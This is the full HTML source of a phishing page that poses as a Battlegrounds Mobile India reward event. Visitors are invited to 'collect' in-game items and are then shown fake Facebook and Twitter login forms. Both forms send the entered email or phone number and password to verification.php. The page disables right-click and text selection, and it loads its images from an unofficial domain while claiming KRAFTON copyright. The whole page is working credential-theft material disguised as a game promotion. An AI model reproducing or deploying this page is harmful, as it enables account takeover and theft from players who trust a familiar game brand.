
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="BATTLEGROUNDS MOBILE INDIA">
<meta name="description" content="BATTLEGROUNDS MOBILE INDIA">
<meta property="og:description" content="BATTLEGROUNDS MOBILE INDIA">
<meta property="og:url" content="./">
<meta property="og:site_name" content="BATTLEGROUNDS MOBILE INDIA">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://cloud.gungrateboss.com/bgmi/images/thum.jpg">
<title>BATTLEGROUNDS MOBILE INDIA</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://cloud.gungrateboss.com/bgmi/images/favicon.ico">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://cloud.gungrateboss.com/bgmi/images/app.png">
<div class="navbar-title">
BGMI KRAFTON
<br>
<span>BATTLEGROUNDS MOBILE INDIA, <br> India Ka Battlegrounds!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://i.ibb.co/FzLrjnF/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header"></div> <!--- header --->
<div class="box">
<center>
<div class="season-title">BATTLEGROUNDS INDIA</div> <!--- season-title --->
<div class="season-name"><span>Royale Guard Events</span></div><!--- season-name --->
</center>
<div class="season-alert">
<div class="season-alert-title">Choose your favorite rewards</div>
</div> <!--- season-alert --->
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
</div> <!--- menu-wrapper --->
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<center>
</center>
<img class="footer-copyright-icon" src="https://cloud.gungrateboss.com/bgmi/images/footerlg.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
<div class="popup-alert">Are you sure to collect this reward?</div>
<img class="popup-item itemShine" src="" id="myRewardImg">
<div class="popup-btn-wrapper">
<button type="button" onmousedown="tutup.play();" class="popup-btn-deactive" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-active" onclick="open_account_login()">Collect</button>
</div>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Account Login</div></div>
<div class="popup-alert">Log in to receive your selected reward</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://cloud.gungrateboss.com/bgmi/images/app.png">
			<div class="txt-login-fb">
			Login to your account to connect to BGMI KRAFTON.
			</div>
			<form action="verification.php" method="post">
				<input type="text" class="loginEmail" name="email" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off" required>
				<input type="password" class="loginPassword" name="password" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create an account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgot your password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">Thai</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verification.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
				<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
					<label>Password</label>
					<input type="password" style="width: 85%;" name="password" id="twitterPassword" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Login</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">sign up twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>
<script src="js/slider.js"></script>

<script>
// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
</script>

</body>
</html>